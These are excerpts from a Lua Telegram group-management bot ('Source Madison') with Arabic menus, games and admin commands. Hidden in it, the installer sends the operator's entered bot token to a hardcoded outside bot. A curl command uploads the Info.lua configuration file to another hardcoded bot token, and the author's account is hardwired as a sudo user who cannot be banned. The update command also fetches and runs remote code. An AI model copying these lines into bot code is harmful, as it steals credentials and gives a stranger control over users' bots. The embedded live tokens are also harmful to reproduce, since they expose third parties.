...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=kamal&text=' ..token)
end 
else
print('\27[0;35m༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "༆╾╾╾╾[𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩 ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "༆╾╾╾╾[𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩 ༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩 ┉"
exit 1
fi
if [ ! $token ]; then
echo "༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩 ༆╾╾╾╾𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪╾╾╾╾〩 ┉ ┉"
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MADISON111110/MADISON/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1208165035,1744308503,kamal}   
...
var = true
elseif tonumber(user_id) == tonumber(kamal) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'ماديسون'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "SO_MADI")
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ماديسون') 
local DRAGON_Msg = { 
...
{{text = '𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪', url="t.me/SO_MADI"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
{'الاحصائيات'},
{'اوامر المسح','اوامر الاشتراك الاجباري'},
{'تحديث السورس'},
...
os.execute('wget https://raw.githubusercontent.com/MADISON111110/MADISON/main/DRAGON.lua')
...
local Text = 'قسم اوامر المسح لمسح كل شئ ف البوت'
local Key = {
...
if text == 'اوامر الردود' and DevSoFi(msg) then 
local Text = 'قسم اوامر الردود لوضع جميع الردود ومسحها ف البوت'
local Key = {
...
if text == 'اوامر الاشتراك الاجباري' and DevSoFi(msg) then 
local Text = 'قسم الاشتراك الاجباري لوضع قناتك ف البوت'
local Key = {
...
if text == 'اوامر التعطيل' and DevSoFi(msg) then 
local Text = 'قسم التعطيل لتعطيل كل شئ في البوت'
local Key = {
{'تعطيل الاذاعه'},
{'تعطيل المغادره'},
{'تعطيل التواصل'},
...
local Text = 'قسم التفعيل لتفعيل كل شئ ف البوت'
local Key = {
{'تفعيل الاذاعه'},
{'تفعيل المغادره'},
{'تفعيل التواصل'},
...
if text == 'اوامر الجلب' and DevSoFi(msg) then 
local Text = 'اوامر الجلب للنسخ الخاصه ب البوت'
local Key = {
{'جلب المطورين','جلب الثانوين'},
{'جلب نسخه الاحتياطيه','جلب التوكن'},
{'الرجوع'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SO_MADI)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
else
...
usertext = '\n ☆ العضو ← ['..result.title_..'](t.me/'..(username or 'SO_MADI')..')'
status  = '\n ☆ تم ترقيته مطور'
...
usertext = '\n ☆ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_MADI')..')'
status  = '\n ☆ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SO_MADI')..') \n ☆ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ماديسون")
...
send(msg.chat_id_,0," ☆ العضو : {["..data.first_name_.."](T.ME/SO_MADI)}\n ☆ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☆ عذرا ← {["..data.first_name_.."](T.ME/SO_MADI)}\n ☆ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON111110/MADISON/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON111110/MADISON/main/library')
os.execute('wget https://raw.githubusercontent.com/MADISON111110/MADISON/main/File_Bot')
send(msg.chat_id_, msg.id_,' ☆ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'سورس مين' then
local msg_id = msg.id_/2097152/0.5
local Text = [[

❍[◍ 𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ](t.me/AAHMEED11)

❍[◍ 𝐃𝐞𝐯 𝐊𝐚𝐦𝐚𝐥 ](t.me/W_H_U)

❍[◍ 𝐂𝐡 𝐌𝐚𝐝𝐢𝐬𝐨𝐧  ](t.me/SO_MADl)
...
{{text = '❍ 𝐂𝐡 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 𖣌 ',url="t.me/SO_MADl"}},
...
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/MADI_PICK/30&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == '✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪' then
local Text = [[ 
◉ يمكنك التواصل معي..↑↓
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '℡ ᯓ 𓌹 𝐃𝐀𝐃 𝐌𝐀𝐃𝐈𝐒𝐎𝐍 𓌺 ˹', url="t.me/AAHMEED11"}}, 
{{text = '𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪', url="t.me/AAHMEED11"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/29&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪', url="t.me/ELKAEEB1"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/29&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'كمال' or text == 'كوكي' or text == 'قلب مها' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '◉ 𝐃𝐄𝐕 𝐊𝐀𝐌𝐀𝐋 ◉',url="t.me/W_H_U"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/10&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'عايز بوت' then
local Text = [[ 
◉ للتواصل مع مبرمجين سورس ماديسون ♡
◉ اتبع الازرار الاتيه ↑↓
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '℡ ᯓ 𓌹 𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 𓌺 ˹',url="t.me/AAHMEED11"},{text = '℡ ᯓ 𓌹 𝐃𝐞𝐯 𝐊𝐚𝐦𝐚𝐥 𓌺 ˹',url="t.me/W_H_U"},},
{{text = '℡ ᯓ 𓌹 𝐅𝐨𝐫 𝐓𝐨 𝐀𝐬𝐤 𓌺 ˹',url="t.me/E_H_M_BOT"}},
{{text = '𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪', url="t.me/SO_MADl"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/29&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت اليوتيوب',url="t.me/AL_YOUT_BOT"}},
{{text = 'بوت تيك توك',url="t.me/K0XBOT"}},
{{text = 'بوت انستقرام',url="t.me/J33Bot"}},
{{text = 'بوت قران',url="t.me/Maq_1bot"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_MADI&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس ماديسون ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس ماديسون ؟ ", 
"كم مره حبيت؟ ", 
...
{
{text = 'العاب متطوره', callback_data="/MADISON"},
},
{
...
if text == 'العاب ماديسون' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
{{text = '🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎', url="t.me/SO_MADI"}},
}  
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ☆ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SO_MADI')..') \n ☆ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SO_MADI')..') \n ☆ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(kamal) then  
...
if result.id_ == tonumber(kamal) then
send(msg.chat_id_, msg.id_, " ♡ لا يمكنك حظر مبرمج السورس عام  \n")
return false 
end
usertext = '\n ☆ العضو ← ['..result.title_..'](t.me/'..(username or 'SO_MADI')..')'
...
if tonumber(userid) == tonumber(kamal) then  
send(msg.chat_id_, msg.id_, " ♡ لا يمكنك حظر مبرمج السورس عام ")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MADISON111110/MADISON/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☆ اهلا بك في متجر ملفات ماديسون\n ☆ ملفات السورس ↓\n≪✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪≫\n\n"
local TextE = "\n✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪\n ☆ علامة تعني { ✔️ } ملف مفعل\n ☆ علامة تعني { x } ملف معطل\n ☆ قناة سورس ماديسون ↓\n".." ☆ [اضغط هنا لدخول](t.me/SO_MADI) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON111110/MADISON/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☆ عذرا الملف لايدعم سورس ماديسون \n") 
end
return false
end
...
if text == ("مسح قائمه ماديسون") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☆ تم مسح قائمه ماديسون')
return false
end

if text == 'قائمه ماديسون' and Sudo(msg) then
...
if #list == 0 then
t = " ☆ لا يوجد احد في قائمه ماديسون"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع ماديسون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
...
if text and text:match("^رفع ماديسون @(.*)$") and Sudo(msg) then
local username = text:match("^رفع ماديسون @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
...
if text and text:match("^رفع ماديسون (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ماديسون (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
...
if text == ("تنزيل ماديسون") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
...
if text and text:match("^تنزيل ماديسون @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ماديسون @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
...
if text and text:match("^تنزيل ماديسون (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ماديسون (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local SO_MADI = database:get(bot_id..'text:ch:user')
if SO_MADI then
send(msg.chat_id_, msg.id_,'['..SO_MADI..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☆ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_MADI')..')'
status  = '\n ☆ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☆ العضو ← '..userid..''
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☆ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'SO_MADI')..')'..'\n ☆ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ماديسون').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ماديسون')
local DRAGON_Msg = {
'ننعم يروحي 😻♥️',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
keyboard.inline_keyboard = { 
{
{text = '〈〈𝚂𝙾𝚄𝚁𝙲𝙴 ★ 𝙲𝙷𝙰𝙽𝙽𝙴𝙻〉〉', url="t.me/SO_MADI"},
},
} 
local msg_id = msg.id_/2097152/0.5 
...
database:set(bot_id.."SO_MADI:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"☆تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."SO_MADI:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."SO_MADI:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس ماديسون يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ماديسون').." غادر" or text == 'غادر' then  
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري نور عنيا🥺🤍](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مطوري الثاني حته مني 😍💚](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت المطور بس الصغنن 🌝💘](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[نت المالك هن يعني حاجه فوق فوق راسي 😂♥](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه??🤦‍♂️](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ انت مميز ابن ناس 😊 ](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
local msg_id = msg.id_/2097152/0.5  
local textt = '[ عضو قميل 🌝💘 ](t.me/SO_MADI)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه ماديسون') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SO_MADI')..')'
local iduser = result.sender_user_id_
...
✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪
☆ اليك الاوامر الخاص بسورس ماديسون .
☆ اختر الامر الذي تريده من الازرار بلاسفل .
✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪
☆ ᑕᕼ -> [𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪](t.me/SO_MADI)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = '☆ اوامر التسليه .', callback_data="/help7"},{text = '☆ المميزات والالعاب.',callback_data="/MADISON111110"},
},
{
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'لعبه البات', url="https://t.me/SO_MADI"},{text = 'لعبه الرياضيات',url="https://t.me/SO_MADI"}},   
{{text = 'لعبه المختلف', url="https://t.me/SO_MADI"},{text = 'لعبه السمايلات', url="https://t.me/SO_MADI"}}, 
{{text = 'لعبه العكس', url="https://t.me/SO_MADI"}}, 
{{text = 'لعبه الاسرع', url="https://t.me/SO_MADI"},{text = 'لعبه الانكليزي', url="https://t.me/SO_MADI"}}, 
{{text = 'لعبه حزوره', url="https://t.me/SO_MADI"},{text = 'لعبه المعاني', url="https://t.me/SO_MADI"}}, 
{{text = 'لعبه الامثله', url="https://t.me/SO_MADI"},{text = 'عقاب', url="https://t.me/SO_MADI"}},
{{text = 'مريم', url="https://t.me/SO_MADI"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/MADISON111110"}},
{{text = '𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪', url="t.me/SO_MADI"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/MADISON' then
local Teext =[[
✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪
  ◉ اهلا في قائمه الالعاب المتطوره سورس ماديسون  ◉ 
...
local Teext =[[
✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪
✧بك في مميزات سورس ماديسون✧
✧مميزات الخاصه بسورس✧
✪❯─────「𝐌𝐀𝐃𝐈𝐒𝐎𝐍」─────❮✪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تويت', url="https://t.me/SO_MADI"},{text = 'كتبات',url="https://t.me/SO_MADI"}},   
{{text = 'انصحني', url="https://t.me/SO_MADI"},{text = 'لو خيروك', url="https://t.me/SO_MADI"}}, 
{{text = 'الصراحه', url="https://t.me/SO_MADI"},{text = 'حروف', url="https://t.me/SO_MADI"}}, 
{{text = 'رزله', url="https://t.me/SO_MADI"},{text = 'رد عليه يابوت', url="https://t.me/SO_MADI"}}, 
{{text = 'بتكره دا', url="https://t.me/SO_MADI"},{text = 'نكته', url="https://t.me/SO_MADI"}}, 
{{text = 'غنيلي', url="https://t.me/SO_MADI"}},
{{text = 'نسبه جمالي', url="https://t.me/SO_MADI"},{text = 'اليتيوب', url="https://t.me/SO_MADI"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/MADISON111110"}},
{{text = '𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪', url="t.me/SO_MADI"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
...
--- callback added
if Text == '/MADISON111110' then
local Teext =[[
 ─────── ☆ ───────
☆ العاب و مميزات سورس ماديسون ☆
 ─────── ☆ ───────
[𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐃𝐈𝐒𝐎𝐍⌯𓆪](t.me/SO_MADI)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. kamal ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
